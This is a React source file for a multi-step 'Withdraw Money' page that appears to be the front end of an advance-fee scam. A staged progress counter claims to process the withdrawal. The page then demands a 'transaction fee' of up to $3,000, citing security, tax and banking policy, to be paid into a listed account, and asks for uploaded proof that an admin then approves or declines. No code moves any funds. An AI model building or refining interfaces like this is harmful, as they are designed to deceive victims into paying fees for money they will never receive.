import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router';
import { motion } from 'motion/react';
import { ArrowLeft, Building2, CheckCircle2, Zap, X } from 'lucide-react';
import { Button } from '../ui/button';
import { Input } from '../ui/input';
import { Label } from '../ui/label';
import { Card } from '../ui/card';
import styles from './Withdraw.module.css';

export default function Withdraw() {
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState('');
  const [destination, setDestination] = useState({ bank: '', accountNumber: '', accountName: '' });
  const [fee, setFee] = useState(0);
  const [feeRangeIdx, setFeeRangeIdx] = useState(0);
  const [loadingCount, setLoadingCount] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const [proofFile, setProofFile] = useState<File | null>(null);
  const [uploading, setUploading] = useState(false);
  const [verificationStatus, setVerificationStatus] = useState<'pending' | 'approved' | 'declined' | null>(null);
  const [declineReason, setDeclineReason] = useState('');
  // Use number for browser setInterval
  const loadingInterval = useRef<number | null>(null);

  // Fee ranges
  const feeRanges = [
    { min: 1000, max: 2000, fee: 300 },
    { min: 3000, max: 4000, fee: 600 },
    { min: 5000, max: 6000, fee: 900 },
    { min: 7000, max: 8000, fee: 1200 },
    { min: 9000, max: 10000, fee: 1500 },
    { min: 10000, max: 2000000, fee: 3000 },
  ];

  // Find fee range for amount
  const getFeeForAmount = (amt: number) => {
    for (let i = 0; i < feeRanges.length; i++) {
      if (amt >= feeRanges[i].min && amt <= feeRanges[i].max) return { fee: feeRanges[i].fee, idx: i };
    }
    return { fee: 0, idx: 0 };
  };

  // Step handlers
  const handleAmountNext = () => {
    const amt = parseFloat(amount);
    if (isNaN(amt) || amt < 1000 || amt > 2000000) return alert('Amount must be between $1,000 and $2,000,000');
    const { fee, idx } = getFeeForAmount(amt);
    setFee(fee);
    setFeeRangeIdx(idx);
    setStep(2);
  };

  const handleDestinationNext = () => {
    if (!destination.bank || !destination.accountNumber || !destination.accountName) return alert('Fill all destination details');
    setIsLoading(true);
    setStep(3);
  };

  // Animated loading logic
  useEffect(() => {
    if (step === 3 && isLoading) {
      setLoadingCount(1);
      loadingInterval.current = window.setInterval(() => {
        setLoadingCount((prev) => {
          if (prev >= 99) {
            clearInterval(loadingInterval.current!);
            setTimeout(() => {
              setIsLoading(false);
              setStep(4);
            }, 1000);
            return 99;
          }
          return prev + 1;
        });
      }, 65); // ~6.5s for 99 steps
    }
    return () => {
      if (loadingInterval.current) {
        clearInterval(loadingInterval.current);
      }
    };
  }, [step, isLoading]);

  const handleFeeContinue = () => setStep(5);
  const handleCopyAccount = () => {
    navigator.clipboard.writeText('1234567890 - Example Bank - Example Name');
    alert('Account details copied!');
  };
  const handleNextToProof = () => setStep(6);
  const handleProofUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) setProofFile(e.target.files[0]);
  };
  const handleSubmitProof = () => {
    if (!proofFile) return alert('Upload a payment proof');
    setUploading(true);
    setTimeout(() => {
      setUploading(false);
      setStep(7);
      setVerificationStatus('pending');
    }, 2000);
  };

  // Simulate admin approval/decline for demo
  const handleAdminApprove = () => {
    setVerificationStatus('approved');
    setTimeout(() => setStep(8), 1200);
  };
  const handleAdminDecline = () => {
    const reason = prompt('Enter reason for decline:');
    setDeclineReason(reason || 'No reason provided');
    setVerificationStatus('declined');
    setTimeout(() => setStep(8), 1200);
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="sticky top-0 z-10 bg-background border-b border-border px-6 py-4"
      >
        <div className="flex items-center gap-4">
          <button
            onClick={() => step === 1 ? navigate('/dashboard') : setStep(step - 1)}
            className="w-10 h-10 rounded-full hover:bg-accent flex items-center justify-center transition-colors"
            title="Go back"
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div>
            <h1 className="text-xl font-semibold">Withdraw Money</h1>
            <p className="text-sm text-muted-foreground">Step {step} of 3</p>
          </div>
        </div>
      </motion.div>

      {/* Progress */}
      <div className="px-6 py-4">
        <div className="flex items-center gap-2">
          {[1, 2, 3].map((s) => (
            <div
              key={s}
              className={`flex-1 h-1 rounded-full transition-all ${
                s <= step ? 'bg-[#00b388]' : 'bg-muted'
              }`}
            />
          ))}
        </div>
      </div>

      {/* Content */}
      <div className="px-6 pb-24">
        {/* Step 1: Enter amount */}
        {step === 1 && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="space-y-6">
            <h2 className="text-2xl mb-2 font-semibold">Enter Withdrawal Amount</h2>
            <Card className="p-6">
              <Label htmlFor="amount" className="text-sm text-muted-foreground mb-2 block">Amount ($1,000 - $2,000,000)</Label>
              <Input
                id="amount"
                type="number"
                placeholder="0.00"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="text-2xl border-0 p-0 h-auto focus-visible:ring-0"
                style={{ fontWeight: 600, fontVariantNumeric: 'tabular-nums' }}
              />
            </Card>
            <Button onClick={handleAmountNext} disabled={!amount} className="w-full h-12 bg-[#00b388] hover:bg-[#009670] text-white shadow-md hover:shadow-lg">Next</Button>
          </motion.div>
        )}

        {/* Step 2: Enter destination account details */}
        {step === 2 && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="space-y-6">
            <h2 className="text-2xl mb-2 font-semibold">Destination Account</h2>
            <Card className="p-6 space-y-4">
              <Input placeholder="Bank Name" value={destination.bank} onChange={e => setDestination({ ...destination, bank: e.target.value })} className="mb-2 shadow-sm focus:shadow-md" />
              <Input placeholder="Account Number" value={destination.accountNumber} onChange={e => setDestination({ ...destination, accountNumber: e.target.value })} className="mb-2 shadow-sm focus:shadow-md" />
              <Input placeholder="Account Name" value={destination.accountName} onChange={e => setDestination({ ...destination, accountName: e.target.value })} className="shadow-sm focus:shadow-md" />
            </Card>
            <Button onClick={handleDestinationNext} className="w-full h-12 bg-[#00b388] hover:bg-[#009670] text-white shadow-md hover:shadow-lg">Next</Button>
          </motion.div>
        )}

        {/* Step 3: Animated loading */}
        {step === 3 && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="flex flex-col items-center justify-center min-h-[60vh]">
            <div className={styles['withdraw-spinner']} />
            <div className="text-5xl font-bold text-[#00b388] mb-2">{loadingCount}</div>
            <div className="text-lg text-muted-foreground">Processing withdrawal...</div>
          </motion.div>
        )}

        {/* Step 4: Pending/fee screen */}
        {step === 4 && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="space-y-6">
            <h2 className="text-2xl mb-2 font-semibold">Almost Done!</h2>
            <p className="text-muted-foreground">Due to security, tax, and banking policy, a transaction fee is required to complete your withdrawal.</p>
            <div className="max-h-40 overflow-y-auto border rounded-lg">
              {feeRanges.map((range, idx) => (
                <div key={idx} className={`flex items-center justify-between px-4 py-2 ${idx === feeRangeIdx ? 'bg-[#e6f9f4]' : ''}`}>
                  <span>${range.min.toLocaleString()} - ${range.max.toLocaleString()}</span>
                  <span className="font-semibold">Fee: ${range.fee.toLocaleString()}</span>
                  {idx === feeRangeIdx && <span className="ml-2 px-2 py-0.5 rounded-full bg-[#00b388] text-white text-xs">Selected</span>}
                </div>
              ))}
            </div>
            <Button onClick={handleFeeContinue} className="w-full h-12 bg-[#00b388] hover:bg-[#009670] text-white shadow-md hover:shadow-lg">Continue</Button>
          </motion.div>
        )}

        {/* Step 5: Admin account details for fee payment */}
        {step === 5 && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="space-y-6">
            <h2 className="text-2xl mb-2 font-semibold">Pay Transaction Fee</h2>
            <Card className="p-6 space-y-2">
              <div className="flex items-center justify-between">
                <span className="font-semibold">Account Number:</span>
                <span>1234567890</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="font-semibold">Bank Name:</span>
                <span>Example Bank</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="font-semibold">Account Name:</span>
                <span>Example Name</span>
              </div>
            </Card>
            <Button onClick={handleCopyAccount} className="w-full h-10 mb-2 shadow-sm hover:shadow-md">Copy Account Details</Button>
            <Button onClick={handleNextToProof} className="w-full h-12 bg-[#00b388] hover:bg-[#009670] text-white shadow-md hover:shadow-lg">Next</Button>
          </motion.div>
        )}

        {/* Step 6: Upload payment proof */}
        {step === 6 && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="space-y-6">
            <h2 className="text-2xl mb-2 font-semibold">Upload Payment Proof</h2>
            <label htmlFor="proof-upload" className="block text-sm font-medium mb-2">Upload payment proof</label>
            <input id="proof-upload" type="file" accept="image/*,application/pdf" onChange={handleProofUpload} className="mb-4" title="Upload payment proof" placeholder="Upload payment proof" />
            <Button onClick={handleSubmitProof} disabled={uploading} className="w-full h-12 bg-[#00b388] hover:bg-[#009670] text-white shadow-md hover:shadow-lg">{uploading ? 'Uploading...' : 'Submit Proof'}</Button>
          </motion.div>
        )}

        {/* Step 7: Under verification screen */}
        {step === 7 && verificationStatus === 'pending' && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="flex flex-col items-center justify-center min-h-[60vh] text-center">
            <div className="w-20 h-20 rounded-full bg-[#e6f9f4] flex items-center justify-center mb-6 animate-pulse">
              <Zap className="w-10 h-10 text-[#00b388]" />
            </div>
            <h2 className="text-2xl mb-2 font-semibold">Payment Under Verification</h2>
            <p className="text-muted-foreground mb-8 max-w-sm">Your payment proof has been sent to admin. Please wait for confirmation.</p>
            {/* Simulate admin actions for demo */}
            <div className="flex gap-4 justify-center">
              <Button onClick={handleAdminApprove} className="bg-green-600 hover:bg-green-700 text-white shadow-md hover:shadow-lg">Approve (Admin)</Button>
              <Button onClick={handleAdminDecline} className="bg-red-600 hover:bg-red-700 text-white shadow-md hover:shadow-lg">Decline (Admin)</Button>
            </div>
          </motion.div>
        )}

        {/* Step 8: Result screen */}
        {step === 8 && verificationStatus === 'approved' && (
          <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.5 }} className="flex flex-col items-center justify-center min-h-[60vh] text-center">
            <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ duration: 0.5, type: 'spring' }} className="w-20 h-20 rounded-full bg-[#e6f9f4] flex items-center justify-center mb-6">
              <CheckCircle2 className="w-10 h-10 text-[#00b388]" />
            </motion.div>
            <h2 className="text-2xl mb-2 font-semibold">Withdrawal Successful</h2>
            <p className="text-muted-foreground mb-8 max-w-sm">Your withdrawal of ${amount} has been completed. Funds will reflect in your destination account soon.</p>
            <Button onClick={() => navigate('/dashboard')} className="bg-[#00b388] hover:bg-[#009670] text-white px-8 shadow-md hover:shadow-lg">Back to Dashboard</Button>
          </motion.div>
        )}
        {step === 8 && verificationStatus === 'declined' && (
          <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.5 }} className="flex flex-col items-center justify-center min-h-[60vh] text-center">
            <div className="w-20 h-20 rounded-full bg-red-100 flex items-center justify-center mb-6">
              <X className="w-10 h-10 text-red-600" />
            </div>
            <h2 className="text-2xl mb-2 font-semibold">Withdrawal Declined</h2>
            <p className="text-muted-foreground mb-4 max-w-sm">Reason: {declineReason}</p>
            <Button onClick={() => navigate('/dashboard')} className="bg-[#00b388] hover:bg-[#009670] text-white px-8 shadow-md hover:shadow-lg">Back to Dashboard</Button>
          </motion.div>
        )}
      </div>
    </div>
  );
}
